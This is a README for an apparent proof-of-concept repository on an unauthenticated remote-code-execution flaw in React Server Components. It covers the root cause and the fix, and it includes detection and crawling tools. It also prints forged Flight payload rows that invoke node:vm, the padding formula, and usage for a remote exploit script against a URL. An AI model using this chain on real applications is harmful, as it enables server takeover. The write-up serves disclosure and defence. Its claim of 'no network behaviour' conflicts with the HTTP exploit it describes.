# GHSA-xqc2-xf4c-x3h3 — Unauthenticated RCE in React Server Components

A reproducible proof of concept for the critical advisory in `react-server-dom-*`,
built against the real packages: **19.2.8** (vulnerable) and **19.2.9** (patched),
side by side in one run.

| | |
|---|---|
| Advisory | [GHSA-xqc2-xf4c-x3h3](https://github.com/react/react/security/advisories/GHSA-xqc2-xf4c-x3h3) |
| Severity | Critical, CVSS v4 **9.5** (`AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H`) |
| Packages | `react-server-dom-webpack`, `react-server-dom-turbopack`, `react-server-dom-parcel` |
| Affected | 19.0.0–19.0.8, 19.1.0–19.1.9, 19.2.0–19.2.8, 19.3.0 |
| Patched | **19.0.9, 19.1.10, 19.2.9, 19.3.1** |
| Precondition | a response that transports multiple typed arrays **and** an attacker-controlled value |
| CVE | none assigned at time of writing |

> The advisory itself publishes no technical detail beyond the trigger condition.
> Everything below was derived from the 19.2.8 → 19.2.9 source diff and confirmed
> by running it.

---

## Run it

Needs **Node ≥ 22** (for `ArrayBuffer.prototype.detached`) and network access for
the installs. Verified on Node 26.11.1 on the host and Node 22.23.4 in the
containers. Docker is needed only for the HTTP path.

### Path A — in process, no Docker

The whole chain with a byte-level view of the wire at each step:

```bash
npm run setup       # once: installs 19.2.8 and 19.2.9 into isolated node_modules
npm run poc
```

```
  react-server-dom-webpack 19.2.8   code executed: true
  react-server-dom-webpack 19.2.9   code executed: false

  PoC reproduced.
```

It leaves `artifacts/PWNED.json`, written by the payload, containing the output
of `id` run on the consumer.

### Path B — over HTTP on localhost

Two full stacks of the same application, differing only in the package version:

```bash
npm run docker:up      # build + start both (idempotent)
npm run docker:poc     # exploit both, side by side
```

| URL | stack | expected |
|---|---|---|
| `http://localhost:3000` | 19.2.8 **vulnerable** | exploitable |
| `http://localhost:4000` | 19.2.9 patched | the control |

```
  vulnerable (19.2.8)  server 19.2.8   desync YES   code executed YES
  patched (19.2.9)     server 19.2.9   desync no    code executed no

  PoC reproduced over HTTP.
```

### Everything there is to run

| command | what it shows |
|---|---|
| `npm run poc` | the end-to-end chain, in process, with the wire dumped at each step |
| `npm run poc:prod` | the same against **production** React builds — this is not a dev-only issue |
| `npm run poc:exec` | the same, but the gadget is `child_process.execSync`, so the payload is a shell command |
| `npm run primitives` | each client-side primitive in isolation, 19.2.8 vs 19.2.9 |
| `npm run dos` | the easier corollary: two ordinary `Buffer`s in one response kill the render |
| `npm run docker:up` / `:down` / `:logs` | bring the two localhost stacks up, down, or tail them |
| `npm run docker:poc` | the remote exploit over HTTP against both stacks |
| `npm run detect` | **is a given app affected?** — see [Is *my* application affected?](#is-my-application-affected) |
| `npm run detect:crawl` | the same framing check across every route of the running container |
| `npm run clean` | delete `artifacts/` (wire dumps and payload evidence) |

Exit status is `0` when the expected result was observed, so these work in CI.
`npm run detect` exits `1` in this repo by design: it finds the deliberately
vulnerable copy under `env/vulnerable`.

---

## Over the network, against a containerised app

The scripts above prove the mechanism in-process. The compose stack proves the
part that matters operationally: **one unauthenticated HTTP request to a service,
and code runs inside it.** Two complete stacks of the same application come up,
differing only in the package version.

```bash
npm run docker:up     # builds and starts both stacks
npm run docker:poc    # the remote exploit, against both URLs
npm run docker:down
```

```
                 ┌─────────────────────────┐      ┌──────────────────────────┐
  attacker ─────▶│ web-vulnerable  :3000   │─────▶│ rsc-vulnerable  (internal)│
  (HTTP only)    │ SSR consumer, 19.2.8    │      │ renderer, --conditions=   │
                 │ createFromReadableStream│      │ react-server, 19.2.8      │
                 └─────────────────────────┘      └──────────────────────────┘
                 ┌─────────────────────────┐      ┌──────────────────────────┐
                 │ web-patched     :4000   │─────▶│ rsc-patched     (internal)│
                 │ SSR consumer, 19.2.9    │      │ renderer, 19.2.9          │
                 └─────────────────────────┘      └──────────────────────────┘
```

The split mirrors React's own flight fixture, and it is not cosmetic: the
renderer needs the `react-server` export condition and the consumer must not
have it. The payload executes in the **web** tier — the public, internet-facing
process — which is what makes this server-side RCE.

The containers run `node:22-alpine` (Node 22.23.4) while the in-process scripts
were run on Node 26.11.1, so the chain is confirmed on both: this is not tied to
one Node version.

The application (`app/`) is an ordinary attachment viewer. It serves thumbnails
by default and full-resolution attachments on `?full=1`, carving both out of one
decode buffer. It exposes its RSC payload at `/rsc`, exactly as a real RSC app
serves it to browsers. Nothing in it is adversarial, and on 19.2.9 it works.

`poc/remote.mjs` never imports React and never touches the target's filesystem.
It speaks only HTTP:

1. **measure** — `POST /rsc?full=1` with a filler note, then read the framing off
   the response: which binary row was dropped, how many bytes it declared, and
   which chunk id carries the note;
2. **craft** — pad the note so the client resyncs exactly on the injected rows;
3. **fire** — `POST /?full=1` with that note as the body;
4. **verify** — read back the evidence the payload left in a bind-mounted
   directory (so the app needs no special endpoint for the PoC to check itself).

### Poking at it by hand

The app is an ordinary website; nothing special is needed to look at it.

```bash
curl -i 'http://localhost:3000/'                # 200 - thumbnails, the app is healthy
curl -i 'http://localhost:3000/?full=1'         # 500 - the availability bug, no attacker input
curl -i 'http://localhost:4000/?full=1'         # 200 - the patched stack is fine

# one target instead of both, and the inert variant that runs no code
node poc/remote.mjs --url http://localhost:3000 --proof artifacts/remote/vulnerable
node poc/remote.mjs --url http://localhost:3000 --check
```

The corruption is visible in the raw bytes. Row 1 carries its 0xbb8 = 3000 bytes
of `A`; row 2 declares the same length and is followed immediately by row 0:

```
$ curl -s 'http://localhost:3000/rsc?full=1' | xxd
00000000: 313a 6f62 6238 2c41 4141 4141 4141 4141  1:obb8,AAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
...
00000bc0: 3a6f 6262 382c 303a 7b22 6174 7461 6368  :obb8,0:{"attach
00000bd0: 6d65 6e74 4122 3a22 2431 222c 2261 7474  mentA":"$1","att
```

The client has only that header to go by, so it consumes the next 3000 bytes —
the rest of the response — as row 2's contents.

`http://localhost:3000/` opens in a browser too. The payload's evidence lands on
the host at `artifacts/remote/vulnerable/PWNED.json`, bind-mounted out of the
container.

One limitation worth stating: the two app servers run **only** inside the image,
because they resolve `react-server-dom-webpack` from its `node_modules`. There is
no "HTTP on localhost without Docker" path — use Path A for no-Docker, or the
containers for HTTP.

Observed against `http://localhost:3000`:

```
  [0] GET /            -> 200 (thumbnails, 1024 bytes each)
      GET /?full=1     -> 500 (full attachments, 3000 bytes each)
  [1] measured 9080 bytes of RSC payload from http://localhost:3000/rsc?full=1
  @    0 1:obb8,      declared=3000    got=3000   <3000xA>
  @ 3007 2:obb8,      declared=3000    got=3000   3:T1770,<2992xN>
  @ 6014 -20:         newline          got=55     {"attachmentA":"$1",…}
  [2] crafted a 3773-character note: 2993 bytes of padding, then 3 injected rows
  [3] POST http://localhost:3000/?full=1  ->  200 OK, 239 bytes of text/html
  [4] CODE EXECUTED inside the web container:
        { "pid": 6, "cwd": "/srv", "user": "root", "host": "89790dda6ed2",
          "shellOutput": "uid=0(root) gid=0(root) groups=0(root),1(bin),…" }
```

Two things worth noting. The exploit request returns **`200 OK` with a normal
HTML page** — there is no error, nothing in the response distinguishes it from
any other visit. And step `[0]` is the availability half of the same bug: on
19.2.8 the full-resolution route is already broken for every visitor, with no
attacker input at all.

Against `http://localhost:4000` the same script reports:

```
  @ 3007 2:obb8,      declared=3000    got=3000   <3000xB>
  => every binary row carries its own bytes. The wire is sound, so there is
     no resync point to aim at and nothing to inject into.
```

### Checking a target without running code on it

Point it at anything you are authorised to test:

```bash
node poc/remote.mjs --url https://staging.example.com --check
```

`--check` is inert. It measures the framing, then injects a single row that does
nothing but refill the note's chunk id with a token. If that token comes back as
the rendered note, the attacker's bytes were parsed as Flight rows — the whole
finding — and nothing was compiled or executed on the target:

```
  [2] crafted a 3055-character note: 2993 bytes of padding, then 1 injected Flight row (inert probe)
  [3] POST http://localhost:3000/?full=1  ->  200 OK
      the token came back as the rendered note: row injection CONFIRMED

  => this target is exploitable. No code was compiled or run on it.
```

Without `--check` the exploit chain is sent; `--no-verify` additionally skips
reading the evidence back, for a target whose `/proof` directory you cannot see.
Exit status is 0 when the expected result was observed.

The exploit depends on the target serving its RSC payload (`/rsc` here) and on
the note's position being measurable. Against a real framework those details
differ — the route, the parameter and the chunk ids will not match this app — so
treat `remote.mjs` as the method, not a turnkey scanner.

---

## The bug

### 1. Root cause: React transports a typed array without owning its buffer

`ReactFlightServer` emits a typed array as a **length-prefixed binary row** —
a header that declares a byte count, followed by exactly that many raw bytes:

```js
// ReactFlightServer.js — emitTypedArrayChunk()
const binaryChunk = typedArrayToBinaryChunk(typedArray);
const binaryLength = byteLengthOfBinaryChunk(binaryChunk);
const row = id.toString(16) + ':' + tag + binaryLength.toString(16) + ',';
request.completedRegularChunks.push(stringToChunk(row), binaryChunk);
```

The header's length is computed when the row is **queued**. The bytes are written
later, when the request flushes. In 19.2.8 the chunk handed to the destination is
a bare view, with no copy:

```js
// ReactServerStreamConfigNode.js (19.2.8)
export function typedArrayToBinaryChunk(content) {
  return new Uint8Array(content.buffer, content.byteOffset, content.byteLength);
}
```

A chunk larger than `VIEW_SIZE` (2048) is written straight through instead of
being copied into React's own staging view:

```js
// writeChunkAndReturn()
if (chunk.byteLength === 0) {
  return;                                   // <-- silently drops the body
}
if (chunk.byteLength > VIEW_SIZE) {
  ...
  writeToDestination(destination, chunk);   // byte stream => TRANSFERS the buffer
}
```

A byte `ReadableStream` **transfers** (detaches) the whole `ArrayBuffer` of every
chunk it is enqueued. So when a response transports two views over the *same*
`ArrayBuffer`:

1. view A (> 2048 bytes) is written, detaching the shared buffer;
2. view B now reports `byteLength === 0`;
3. `writeChunkAndReturn` takes the `=== 0` branch and writes **nothing** —
   but B's header, declaring the original length, is already on the wire.

### 2. Consequence: the wire desynchronises

The client's row parser has only the declared length to go by, so it reads that
many bytes of *whatever follows* and then resumes row parsing at the resulting
offset. Here is the real wire from step 2 of the PoC (`artifacts/02-probe.rsc`),
as the client parses it:

```
  @    0 0:N          newline          got=17     1794258392082.712
  @   21 1:obb8,      declared=3000    got=3000   <3000xA>          <- view A
  @ 3028 2:obb8,      declared=3000    got=3000   3:T1388,<2992xN>  <- view B: body dropped,
  @ 6035 -20:         newline          got=55     {"attachmentA":…}     so it eats the next rows
```

Row `2` declares 3000 bytes and the server wrote none, so the client consumes the
*next* 3000 bytes as that row's contents — the following row's header plus the
start of its body — and then picks up mid-value. Note the bogus `-20` row id: the
parser is reading a chunk id out of the middle of a string.

### 3. The attacker-controlled value becomes Flight rows

React outlines any string of **1024 characters or more** (`value.length >= 1024`)
into its own length-prefixed `T` row, where the bytes are written **raw and unescaped** — quotes, newlines and
all:

```
3:Tfa0,<4000 bytes of the user's string verbatim>
```

Normally that containment holds: those bytes are only ever read as one row's
body. The desync removes it. The attacker pads their string so that the swallowed
region ends exactly where they want, and the parser resyncs **inside** their own
bytes — which are then parsed as fresh Flight rows:

```
    2:o<len>,
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ the client reads <len> bytes from here
    3:T<len3>,PADDING…PADDING│a:{…}\nb:{…}\n3:"$b"\n
                             ^ resync — from here on, the attacker writes rows
```

The attacker needs only to observe the response once: the padding is
`declaredLength − len("<id>:T<hexlen>,")`. The precondition is exactly the one in
the advisory, and nothing about the request has to be unusual — the string is a
comment, a bio, a search query.

Because the genuine `T` row header was swallowed, the chunk id carrying the note
is never filled, so one injected row refills it. Initializing the real root row
then reaches the attacker's rows on its own: **the application never has to read,
render or await the value.**

### 4. Escalation: row control → code execution

`getOutlinedModel` unwraps anything that looks like a React lazy node by reading
`_payload` and treating it as one of React's own internal chunk records. Nothing
checks the object came from React, and `Symbol.for('react.lazy')` is reachable
from the payload via the unrestricted `$S` symbol encoding:

```js
// ReactFlightClient.js — getOutlinedModel()
while (typeof value === 'object' && value !== null &&
       value.$$typeof === REACT_LAZY_TYPE) {
  const referencedChunk = value._payload;        // <-- a plain object from the payload
  switch (referencedChunk.status) {
    case RESOLVED_MODEL:  initializeModelChunk(referencedChunk);  break;
    case RESOLVED_MODULE: initializeModuleChunk(referencedChunk); break;
  }
  ...
```

Two forged chunks are enough.

**Row `a` — `resolved_module`.** `initializeModuleChunk` calls
`requireModule(chunk.value)` with the forged metadata, so
`resolveClientReference` and the consumer manifest — the only thing that normally
decides which modules a payload may reach — are bypassed entirely. The result is
one arbitrary `__webpack_require__(id)` plus one arbitrary export read:

```json
a:{"$$typeof":"$Sreact.lazy","_payload":{"status":"resolved_module",
   "value":["node:vm",[],"runInThisContext"],"_debugChunk":null}}
```

**Row `b` — `resolved_model`.** In 19.2.8 a chunk in this state keeps the
`Response` object itself in `reason`, and the initializer trusts it:

```js
// ReactFlightClient.js (19.2.8) — initializeModelChunk()
const resolvedModel = chunk.value;
const response = chunk.reason;                       // <-- attacker-controlled object
...
const value = JSON.parse(resolvedModel, response._fromJSON);
```

So the forged chunk supplies **both** the reviver and the document it is applied
to. Point `_fromJSON` at row `a`'s function, and put the payload in a JSON
**key** — `JSON.parse` invokes a reviver as `reviver(key, value, context)`, so the
key lands in the gadget's first parameter:

```json
b:{"$$typeof":"$Sreact.lazy","_payload":{"status":"resolved_model",
   "value":"{\"<attacker source>\":{}}","reason":{"_fromJSON":"$a"},"_debugChunk":null}}
3:"$b"
```

Deserializing the response now calls
`vm.runInThisContext("<attacker source>", {})` in the consumer's own realm.

Observed on 19.2.8, development **and** production builds:

```json
{
  "proof": "arbitrary code executed inside the RSC consumer",
  "pid": 24822,
  "execPath": "/usr/local/bin/node",
  "cwd": "/srv",
  "user": "app",
  "shellOutput": "uid=1000(app) gid=1000(app) groups=1000(app)"
}
```

### Why this is unauthenticated, and where the code runs

Nothing in the chain needs a session, a form action, or any privileged route —
only a request whose response embeds the attacker's string alongside two typed
arrays that share a buffer. The payload executes **wherever the RSC response is
deserialized**:

- a **framework's SSR pass** (Next.js, and any `createFromNodeStream` /
  `createFromReadableStream` consumer) runs in the same Node process as the
  server, so this is server-side RCE;
- a **browser** consumer gets the same primitive against the user's session.

The `__webpack_require__` in row `a` is not an extra assumption:
`react-server-dom-webpack/client` throws without it, so every real consumer has
one. `env/*/load-client.mjs` models a webpack **server** bundle, where Node core
modules are emitted as externals that delegate to `require`. The vulnerability
does not depend on that shim's shape — it depends on a forged chunk reaching
`__webpack_require__` without the manifest being consulted.

---

## The fix (19.2.9)

Server side, the root cause — a view that does not span its whole buffer is now
copied, so writing one view can no longer detach another, and a detached buffer
raises instead of being dropped:

```js
// ReactServerStreamConfig{Node,Edge,Browser}.js (19.2.9)
if (content.byteLength > VIEW_SIZE) {
  const isViewBufferSpanning =
    content.byteOffset === 0 && content.byteLength === content.buffer.byteLength;
  if (!isViewBufferSpanning || content.buffer.resizable) {
    return view.slice();
  }
  ...
}
```

```js
if (chunk.byteLength === 0) {
  if (supportsArrayBufferDetached && chunk.buffer.detached) {
    throw new Error('Cannot transport a detached buffer. …');
  }
  return;
}
```

Client side, defence in depth in `ReactFlightClient.js`:

- a `resolved_model` chunk now holds the Response behind a module-private
  `Symbol`, so a forged `reason` cannot stand in for one;
- `createModel` refuses to return a function for a `then` key, and
  `loadServerReference` bails out on `then`, validates `typeof id === 'string'`,
  and requires `bound instanceof ReactPromise` before awaiting it or slicing
  `bound.value`.

A separate hardening in the same release namespaces client→server reply stream
chunks under an `S` prefix so stream ids can no longer collide with one-shot part
ids (`ReactFlightReplyClient.js` / `ReactFlightReplyServer.js`).

### What 19.2.9 does *not* change

`npm run primitives` reports this directly:

| primitive | 19.2.8 | 19.2.9 |
|---|---|---|
| property-path walk reaches the `Function` constructor | works | works |
| forged `react.lazy` node accepted as an internal chunk | works | works |
| forged `resolved_module` chunk bypasses the consumer manifest | works | **works** |
| forged `resolved_model` chunk supplies its own `Response` | works | blocked |
| a function parked on a `then` key | works | blocked |

The lazy-node confusion and the resulting
`requireModule(<attacker metadata>)` manifest bypass still stand in 19.2.9; they
are simply no longer reachable, because the transport bug that let an attacker
inject rows is gone. Anyone who finds another route to Flight row injection gets
an arbitrary `__webpack_require__` back.

---

## Denial of service (same root cause, much easier)

`npm run dos`. The code-execution chain needs the shared buffer to be
*detachable*. Node's `Buffer` pool slab is not, and 19.2.8 hands the raw view
over anyway — so the write throws and the whole render is lost:

```
  19.2.8   shared=true  RENDER FAILED - 0 bytes delivered
           ArrayBuffer is not detachable and could not be cloned.
  19.2.9   shared=true  rendered 6107 bytes
```

No attacker-controlled value is involved. Every allocation below
`Buffer.poolSize >>> 1` — **every `Buffer` up to 32 KiB** on current Node — comes
out of one shared 64 KiB slab, so *any* response transporting two ordinary
Buffers over 2048 bytes is affected. Two `fs.readFile()` results converted for
transport is enough.

---

## Is *my* application affected?

Two separate questions, and you need both. `poc/detect.mjs` answers each.

### 1. Is a vulnerable runtime installed? (exposure)

```bash
node poc/detect.mjs --scan .
```

**Do not rely on `npm ls react-server-dom-webpack`.** On a Next.js app it prints
`(empty)` while the vulnerable code is still there: Next.js precompiles React
into `next/dist/compiled/`, where a current release ships **four** vendored
copies (`react-server-dom-{webpack,turbopack}`, each also `-experimental`) plus
the Flight runtime inlined into its `next-server/*.runtime.*.js` bundles. A
version-based check misses every one of them.

So the scan keys on **code signatures, not version numbers**:

| half | signature | meaning |
|---|---|---|
| server | the `'detached'` property-name string | `hasOwnProperty.call(ArrayBuffer.prototype, 'detached')` — the root-cause fix |
| client | the `'then'` string literal | the `key === 'then'` guards shipped with the fix |

Both are *string literals*, chosen because they survive a framework re-bundling
React. Identifier names do not (Next.js's minifier renames `RESPONSE_SYMBOL`),
and neither do error messages (Next.js keeps the detach check but strips
`"Cannot transport a detached buffer"`). Measured across the standalone packages
and all of Next.js's vendored copies, each signature appears in 0/N builds before
the fix and N/N after it.

Observed:

```
  AFFECTED react-server-dom-webpack 19.2.8
           server (Flight renderer)   fix present in 0/6 builds  <-- vulnerable
           client (Flight consumer)   fix present in 0/6 builds  <-- vulnerable

  patched  react-server-dom-webpack 19.2.9
           server (Flight renderer)   fix present in 6/6 builds
           client (Flight consumer)   fix present in 6/6 builds

  patched  react-server-dom-webpack  [vendored by next@16.4.6]
           server (Flight renderer)   fix present in 6/6 builds
           client (Flight consumer)   fix present in 5/5 builds
```

If a framework vendors React, **upgrade the framework** — bumping `react` alone
does not replace its precompiled copy.

### 2. Does a response actually desynchronise? (exploitability)

A vulnerable runtime is necessary but not sufficient: the advisory's "rare case"
is the application also transporting two typed arrays over one `ArrayBuffer`
with at least one over 2048 bytes. This checks a live response, read-only:

```bash
node poc/detect.mjs --url 'https://app.example.com/some/route' --rsc
```

It parses the Flight framing and looks for the symptoms of a dropped body, none
of which need any knowledge of what the server meant to send: a declared length
that runs past the end of the stream, a row body that starts with what is
plainly the next row's header, or trailing rows with implausible chunk ids
because the parser resynchronised mid-value.

```
  @    0 1:obb8,      declared=3000    got=3000   <3000xA>
  @ 3007 2:obb8,      declared=3000    got=56     0:{"attachmentA":"$1",…}

  DESYNCHRONISED:
    - row 2 declares 3000 bytes but the stream ends after 56
```

Exit status is `0` for clear, `1` for a finding, `2` for could-not-determine.
`--rsc` sends `Accept: text/x-component` and `RSC: 1`; `--header`, `--method`
and `--body` are there because how you ask for the payload is
framework-specific. Point it at the payload, not the HTML page — it will tell you
if you got that wrong.

A clean result is reported three different ways, because they mean different
things: no typed arrays at all (the bug cannot apply, whatever version is
installed), typed arrays but all **under** the 2048-byte `VIEW_SIZE` (React
copies those, so they are safe), or a typed array **over** it (the size
precondition is met and only the buffer sharing is missing).

### 3. Crawling, because the precondition hides on one route

Checking a route by hand usually checks the wrong one — a homepage carries no
binary. `--crawl` walks one origin and applies the framing check to every route
it finds:

```bash
node poc/detect.mjs --crawl https://app.example.com --rsc --pages 40
```

Against the vulnerable container it finds the affected route unaided:

```
  binary  200  /                                      2118B  bin:2/1024B txt:0
  DESYNC  200  /?full=1                               3070B  bin:2/3000B txt:0
  binary  200  /about                                 2118B  bin:2/1024B txt:0
  not-rsc 200  /health                                  61B

  4 routes fetched, 3 returned an RSC payload
  3 carry typed arrays (1 over the 2048-byte VIEW_SIZE)

  DESYNCHRONISED routes (1):
    /?full=1
      - row 2 declares 3000 bytes but the stream ends after 56
```

`bin:2/3000B` reads as "two binary rows, largest 3000 bytes"; `txt:` is the same
for outlined text rows, the other half of the precondition. The patched stack
reports the identical route as `binary` with no finding — the size precondition
is met there too, only the corruption is gone.

### Why following links is not enough

On a real app, href-following under-reports badly. When the page body is a
client component — which it usually is — the navigation is built in the browser,
so it appears in **neither** the RSC payload nor the static HTML, and a link
crawler sees only the `<link>` tags in the shell. On one production Next.js site
that meant 2 routes discovered on an app with hundreds.

So the crawl seeds from the route list the app publishes itself: the `Sitemap:`
directives in `robots.txt`, falling back to `/sitemap.xml`, including one level
of sitemap-index indirection. That is how the demo crawl above reaches
`/gallery?full=1` — nothing links to it:

```
  sitemap: seeded 4 route(s) from 1 sitemap file(s)

  binary  200  /                                      2118B  bin:2/1024B txt:0
  DESYNC  200  /?full=1                               3070B  bin:2/3000B txt:0
  binary  200  /about                                 2118B  bin:2/1024B txt:0
  DESYNC  200  /gallery?full=1                        3070B  bin:2/3000B txt:0
  not-rsc 200  /health                                  61B
```

When you already know which routes carry binary — and for an app you own you
do — skip the discovery guesswork entirely:

```bash
node poc/detect.mjs --crawl https://app.example.com --rsc --urls routes.txt
```

Each discovered route then costs one request: a framework whose RSC payload is
the element tree carries its own links, so they come out of the payload already
fetched. Only when a payload has none does it make one plain request for the
HTML, for link discovery.

Options: `--pages 25`, `--depth 2`, `--delay 250`, `--urls <file>`,
`--no-sitemap`, `--ignore-robots`.

**The crawler is read-only.** It sends only GETs that a browser would send,
nothing crafted, no injection probe. It is single-origin by design, capped,
serialised with a delay between requests, backs off on 429/503, sends a generic
`User-Agent` with no identifying details, and honours `robots.txt` unless told
not to. It is for an app you own or are authorised to test — it is deliberately
not built for scanning hosts at large.

### The cheap signals, with no tooling

- **Does any route return 5xx only when its binary content is large?** That is
  the giveaway. A desynchronised payload usually fails to deserialize outright
  (`Connection closed.`), so on an affected app a route like this is simply
  broken, and the "rare case" is often already visible as a bug report.
- **Grep your own code for typed arrays crossing the RSC boundary at all.** No
  typed array in any response means no exposure, whatever version you run. Note
  that a `Buffer` does not count: `JSON.stringify` calls its `toJSON()` before
  React's replacer sees it, so it is transported as `{type:'Buffer',data:[…]}`,
  not as binary. The risky pattern is a plain `Uint8Array` **view** —
  `new Uint8Array(buf.buffer, buf.byteOffset, buf.byteLength)`, `.subarray()`,
  or any slice of a shared decode buffer.
- **Then ask whether an attacker-influenced string of 1024+ characters rides in
  the same response.** Without one there is no injection, only the availability
  problem.

### What to do while upgrading

Copy before transporting, so every typed array in a response owns its buffer:

```js
// instead of handing React a view into a shared buffer
return {blob: new Uint8Array(buf.buffer, buf.byteOffset, buf.byteLength)};
// give it one that spans its own
return {blob: new Uint8Array(buf.buffer, buf.byteOffset, buf.byteLength).slice()};
```

`.slice()` is what the patched React does for you.

---

## How reachable is this, really?

The advisory calls the preconditions rare. They are narrower than "any RSC app",
but not exotic:

- Two views over one `ArrayBuffer`, at least one over 2048 bytes. Any
  `subarray()`/`slice`-style split of a decoded blob, protocol frame, image
  buffer or upload does this. Note that a `Buffer` cannot be transported as
  binary at all — `JSON.stringify` calls its `toJSON()` before React's replacer
  sees it — so an application that wants real binary transport must hand React a
  plain `Uint8Array` **view**, which is exactly how the sharing arises.
- One attacker-influenced string of ≥ 1024 characters in the same response, with its
  length and position learnable from a single observation.

Mitigation if upgrading has to wait: copy before transporting
(`view.slice()`), so every typed array in a response owns its buffer.

---

## Layout

```
env/vulnerable/        isolated node_modules @ 19.2.8  + load-server/load-client
env/patched/           isolated node_modules @ 19.2.9  + load-server/load-client
src/app.mjs            the "vulnerable application" model and its three sharing modes
src/wire.mjs           a reader for the Flight row framing; replays how the client parses
src/payload.mjs        payload construction, gadget selection and the byte alignment
poc/render.mjs         server half  — runs under `node --conditions=react-server`
poc/consume.mjs        client half  — runs under the default conditions
poc/run.mjs            driver for the full matrix
poc/primitives.mjs     each client-side primitive in isolation, both versions
poc/dos.mjs            the pooled-Buffer denial of service
poc/detect.mjs         triage: scan installed runtimes, check a response, or crawl an origin
poc/remote.mjs         the remote exploit — HTTP only, no React, no target filesystem
app/rsc-server.mjs     containerised render tier    (--conditions=react-server)
app/web-server.mjs     containerised SSR consumer   (the process that gets owned)
docker/Dockerfile      one image, REACT_VERSION build arg picks 19.2.8 or 19.2.9
compose.yaml           both stacks side by side, :3000 vulnerable / :4000 patched
artifacts/             wire dumps, and the payload's marker under remote/<stack>/
```

Server and client are **separate processes** on purpose: the RSC server needs the
`react-server` export condition and the consumer must not have it, which is also
how a real deployment is arranged.

### Reproducing the analysis

```bash
npm pack react-server-dom-webpack@19.2.8 react-server-dom-webpack@19.2.9
# or, for readable sources:
curl -sL https://raw.githubusercontent.com/facebook/react/v19.2.9/packages/react-server/src/ReactServerStreamConfigNode.js
curl -sL https://raw.githubusercontent.com/facebook/react/v19.2.9/packages/react-client/src/ReactFlightClient.js
```

React's own regression tests for this release are the clearest statement of the
root cause — in
`packages/react-server-dom-webpack/src/__tests__/ReactFlightDOM{Edge,Node}-test.js`:

- `cannot transport multiple buffer-spanning view on the same underlying buffer`
- `does not detach a buffer that the rendered view is only a part of`
- `does not detach a Buffer pool slab with %s`
- `interrupts the stream when a write fails` — *"an errored stream emitted
  incomplete data. Continuing to emit more would produce a corrupted stream"*

---

## Scope

Written for defensive use: to confirm exposure, to test detection, and to justify
the upgrade. It targets only the two package versions it installs locally, writes
only inside `artifacts/`, and contains no network or persistence behaviour. Run
it against systems you own or are authorised to test.
